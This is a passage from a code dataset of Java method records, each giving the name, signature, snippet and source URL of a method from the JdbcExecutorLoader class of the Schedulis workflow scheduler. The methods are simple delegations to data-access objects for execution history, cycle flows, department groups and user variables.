"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31625, "method_name": "listHistoryRecoverRunnning", "class_name": "JdbcExecutorLoader", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> listHistoryRecoverRunnning(final Integer loadSize)\n      throws ExecutorManagerException{\n\n    List<ExecutionRecover> allWaitRunning = new ArrayList<>();\n\n    Map<String, String> paramMap = new HashMap<>();\n    paramMap.put(\"recoverStatus\", Status.RUNNING.getNumVal()+\"\");\n    paramMap.put(\"limitNum\", loadSize + \"\");\n\n    allWaitRunning.addAll(this.executionRecoverDao.listHistoryRecover(paramMap));\n\n    paramMap.put(\"recoverStatus\", Status.PREPARING.getNumVal()+\"\");\n\n    allWaitRunning.addAll(this.executionRecoverDao.listHistoryRecover(paramMap));\n\n    return allWaitRunning;\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31626, "method_name": "getExecutionCycleTotal", "class_name": "JdbcExecutorLoader", "params": ["Optional<String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutionCycleTotal(Optional<String> usernameOp) throws ExecutorManagerException {\n    return this.executionCycleDao.getCycleFlowsTotal(usernameOp);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31627, "method_name": "getExecutionCycleTotal", "class_name": "JdbcExecutorLoader", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutionCycleTotal(String username, List<Integer> projectIds) throws ExecutorManagerException {\n    return this.executionCycleDao.getCycleFlowsTotal(username, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31628, "method_name": "listExecutionCycleFlows", "class_name": "JdbcExecutorLoader", "params": ["Optional<String>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionCycle>", "snippet": "  public List<ExecutionCycle> listExecutionCycleFlows(Optional<String> username, int offset, int length)\n          throws ExecutorManagerException {\n    return this.executionCycleDao.listCycleFlows(username, offset, length);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31629, "method_name": "listExecutionCycleFlows", "class_name": "JdbcExecutorLoader", "params": ["String", "List<Integer>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionCycle>", "snippet": "  public List<ExecutionCycle> listExecutionCycleFlows(String username, List<Integer> projectIds, int offset, int length)\n          throws ExecutorManagerException {\n    return this.executionCycleDao.listCycleFlows(username, projectIds, offset, length);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31630, "method_name": "saveExecutionCycleFlow", "class_name": "JdbcExecutorLoader", "params": ["ExecutionCycle"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int saveExecutionCycleFlow(ExecutionCycle cycleFlow) throws ExecutorManagerException {\n    return this.executionCycleDao.uploadCycleFlow(cycleFlow);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31631, "method_name": "getExecutionCycleFlow", "class_name": "JdbcExecutorLoader", "params": ["String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionCycle", "snippet": "  public ExecutionCycle getExecutionCycleFlow(String projectId, String flowId) throws ExecutorManagerException {\n    return this.executionCycleDao.getExecutionCycleFlow(projectId, flowId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31632, "method_name": "getExecutionCycleFlow", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionCycle", "snippet": "  public ExecutionCycle getExecutionCycleFlow(int id) throws ExecutorManagerException {\n    return this.executionCycleDao.getExecutionCycleFlow(id);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31633, "method_name": "updateExecutionFlow", "class_name": "JdbcExecutorLoader", "params": ["ExecutionCycle"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int updateExecutionFlow(ExecutionCycle cycleFlow) throws ExecutorManagerException {\n    return this.executionCycleDao.updateCycleFlow(cycleFlow);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31634, "method_name": "stopAllCycleFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int stopAllCycleFlows() throws ExecutorManagerException {\n    return this.executionCycleDao.stopAllCycleFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31635, "method_name": "getAllRunningCycleFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionCycle>", "snippet": "  public List<ExecutionCycle> getAllRunningCycleFlows() throws ExecutorManagerException {\n    return this.executionCycleDao.getAllRunningCycleFlows();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31636, "method_name": "getHistoryRecoverTotal", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getHistoryRecoverTotal() throws ExecutorManagerException{\n    return this.executionRecoverDao.getHistoryRecoverTotal();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31637, "method_name": "getProjectLastExecutableFlow", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getProjectLastExecutableFlow(int projectId, String flowId)\n      throws ExecutorManagerException{\n    List<ExecutableFlow> flows = this.executionFlowDao.getProjectLastExecutableFlow(projectId, flowId);\n    if(flows.size() > 0){\n      return flows.get(0);\n    }else{\n      return null;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31638, "method_name": "getUserRecoverHistoryTotal", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserRecoverHistoryTotal(final String userName) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getUserHistoryRecoverTotal(userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31639, "method_name": "getMaintainedHistoryRecoverTotal", "class_name": "JdbcExecutorLoader", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedHistoryRecoverTotal(String username, List<Integer> maintainedProjectIds) throws ExecutorManagerException {\n    return this.executionRecoverDao.getMaintainedHistoryRecoverTotal(username, maintainedProjectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31640, "method_name": "fetchAllLogs", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "LogData", "snippet": "  public LogData fetchAllLogs(final int execId, final String name, final int attempt) throws ExecutorManagerException {\n\n    return this.executionLogsDao.fetchAllLogs(execId, name, attempt);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31641, "method_name": "addExecutorFixed", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Executor", "snippet": "  public Executor addExecutorFixed(final int id, final String host, final int port)\n      throws ExecutorManagerException {\n    return this.executorDao.addExecutorFixed(id, host, port);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31642, "method_name": "listAllLogFilter", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<LogFilterEntity>", "snippet": "  public List<LogFilterEntity> listAllLogFilter() throws ExecutorManagerException {\n\n    return this.logFilterDao.listAllLogFilter();\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31643, "method_name": "getExecHistoryTotal", "class_name": "JdbcExecutorLoader", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getExecHistoryTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31644, "method_name": "getExecHistoryTotal", "class_name": "JdbcExecutorLoader", "params": ["String", "Map<String,String>", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryTotal(String username, final Map<String, String> filterMap, List<Integer> projectIds) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getExecHistoryTotal(username, filterMap, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31645, "method_name": "getMaintainedExecHistoryTotal", "class_name": "JdbcExecutorLoader", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedExecHistoryTotal(String username, List<Integer> projectIds) throws ExecutorManagerException {\n    return this.executionRecoverDao.getMaintainedExecHistoryTotal(username, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31646, "method_name": "getExecHistoryQuickSerachTotal", "class_name": "JdbcExecutorLoader", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryQuickSerachTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getExecHistoryQuickSerachTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31647, "method_name": "getMaintainedFlowsQuickSearchTotal", "class_name": "JdbcExecutorLoader", "params": ["String", "Map<String,String>", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedFlowsQuickSearchTotal(String username, final Map<String, String> filterMap, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    return this.executionRecoverDao.getMaintainedFlowsQuickSearchTotal(username, filterMap, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31648, "method_name": "fetchUserFlowHistoryByProjectIdAndFlowId", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchUserFlowHistoryByProjectIdAndFlowId(final int projectId, final String flowId,\n      final int skip, final int num, final String userName) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchUserFlowHistoryByProjectIdAndFlowId(projectId, flowId, skip, num, userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31649, "method_name": "fetchNumUserExecutableFlowsByProjectIdAndFlowId", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int fetchNumUserExecutableFlowsByProjectIdAndFlowId(final int projectId, final String flowId, final String userName)\n      throws ExecutorManagerException {\n    return this.numExecutionsDao.fetchNumUserExecutableFlowsByProjectIdAndFlowId(projectId, flowId, userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31650, "method_name": "getUserExecHistoryTotal", "class_name": "JdbcExecutorLoader", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecHistoryTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getUserExecHistoryTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31651, "method_name": "getUserExecHistoryQuickSerachTotal", "class_name": "JdbcExecutorLoader", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecHistoryQuickSerachTotal(final Map<String, String> filterMap) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getUserExecHistoryQuickSerachTotal(filterMap);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31652, "method_name": "fetchUserFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "String", "String", "String", "String", "long", "long", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchUserFlowHistory(final String loginUser, final String projContain,\n      final String flowContains,final String execIdContain, final String userNameContains, final String status, final long startTime,\n      final long endTime, final int skip, final int num, final int flowType) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchUserFlowHistory(loginUser, projContain, flowContains, execIdContain,\n        userNameContains, status, startTime, endTime, skip, num, flowType);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31653, "method_name": "getTodayExecutableFlowData", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getTodayExecutableFlowData(final String userName)\n      throws ExecutorManagerException{\n\n    return this.executionFlowDao.getTodayExecutableFlowData(userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31654, "method_name": "getRealTimeExecFlowData", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getRealTimeExecFlowData(final String userName)\n      throws ExecutorManagerException{\n\n    return this.executionFlowDao.getRealTimeExecFlowDataDao(userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31655, "method_name": "getTodayExecutableFlowDataNew", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getTodayExecutableFlowDataNew(String userName) throws ExecutorManagerException {\n    return this.executionFlowDao.getTodayExecutableFlowDataNew(userName);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31656, "method_name": "getTodayFlowRunTimesByFlowId", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getTodayFlowRunTimesByFlowId(final String projectId, final String flowId, final String usename) throws ExecutorManagerException{\n    return this.executionFlowDao.getTodayFlowRunTimesByFlowId(projectId, flowId, usename);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31657, "method_name": "fetchHistoryRecoverFlows", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> fetchHistoryRecoverFlows() throws ExecutorManagerException {\n    return this.executionRecoverDao.fetchHistoryRecover();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31658, "method_name": "getExecutorIdsBySubmitUser", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "  public List<Integer> getExecutorIdsBySubmitUser(String submitUser) throws ExecutorManagerException {\n    return departmentGroupDao.fetchExecutorsIdSBySubmitUser(submitUser);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31659, "method_name": "fetchAllDepartmentGroup", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<DepartmentGroup>", "snippet": "  public List<DepartmentGroup> fetchAllDepartmentGroup() throws ExecutorManagerException {\n    return departmentGroupDao.fetchAllDepartmentGroup();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31660, "method_name": "addDepartmentGroup", "class_name": "JdbcExecutorLoader", "params": ["DepartmentGroup"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void addDepartmentGroup(DepartmentGroup departmentGroup) throws ExecutorManagerException {\n    departmentGroupDao.addDepartmentGroup(departmentGroup);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31661, "method_name": "checkGroupNameIsExist", "class_name": "JdbcExecutorLoader", "params": ["DepartmentGroup"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean checkGroupNameIsExist(DepartmentGroup departmentGroup) throws ExecutorManagerException {\n    return departmentGroupDao.checkGroupNameIsExist(departmentGroup);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31662, "method_name": "checkExecutorIsUsed", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean checkExecutorIsUsed(int executorId) throws ExecutorManagerException {\n    return departmentGroupDao.checkExecutorIsUsed(executorId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31663, "method_name": "deleteDepartmentGroup", "class_name": "JdbcExecutorLoader", "params": ["DepartmentGroup"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int deleteDepartmentGroup(DepartmentGroup departmentGroup) throws ExecutorManagerException {\n    return departmentGroupDao.deleteDepartmentGroup(departmentGroup);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31664, "method_name": "updateDepartmentGroup", "class_name": "JdbcExecutorLoader", "params": ["DepartmentGroup"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int updateDepartmentGroup(DepartmentGroup departmentGroup) throws ExecutorManagerException {\n    return departmentGroupDao.updateDepartmentGroup(departmentGroup);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31665, "method_name": "fetchDepartmentGroupById", "class_name": "JdbcExecutorLoader", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "DepartmentGroup", "snippet": "  public DepartmentGroup fetchDepartmentGroupById(Integer id) throws ExecutorManagerException {\n    return departmentGroupDao.fetchDepartmentGroupById(id);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31666, "method_name": "groupIdIsExist", "class_name": "JdbcExecutorLoader", "params": ["DepartmentGroup"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int groupIdIsExist(DepartmentGroup departmentGroup) throws ExecutorManagerException {\n    return departmentGroupDao.groupIdIsExist(departmentGroup);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31667, "method_name": "addUserVariable", "class_name": "JdbcExecutorLoader", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void addUserVariable(UserVariable userVariable) throws ExecutorManagerException {\n    this.userVariableDao.addUserVariable(userVariable);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31668, "method_name": "deleteUserVariable", "class_name": "JdbcExecutorLoader", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int deleteUserVariable(UserVariable variable) throws ExecutorManagerException {\n    return this.userVariableDao.deleteUserVariable(variable);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31669, "method_name": "updateUserVariable", "class_name": "JdbcExecutorLoader", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int updateUserVariable(UserVariable userVariable) throws ExecutorManagerException {\n    return this.userVariableDao.updateUserVariable(userVariable);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31670, "method_name": "fetchAllUserVariable", "class_name": "JdbcExecutorLoader", "params": ["UserVariable"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<UserVariable>", "snippet": "  public List<UserVariable> fetchAllUserVariable(UserVariable userVariable) throws ExecutorManagerException {\n    return this.userVariableDao.fetchAllUserVariable(userVariable);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31671, "method_name": "getUserVariableById", "class_name": "JdbcExecutorLoader", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "UserVariable", "snippet": "  public UserVariable getUserVariableById(Integer id) throws ExecutorManagerException {\n    return this.userVariableDao.getUserVariableById(id);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31672, "method_name": "getUserVariableByName", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getUserVariableByName(String userName) throws ExecutorManagerException {\n    return this.userVariableDao.getUserVariableByName(userName);\n  }", "url": 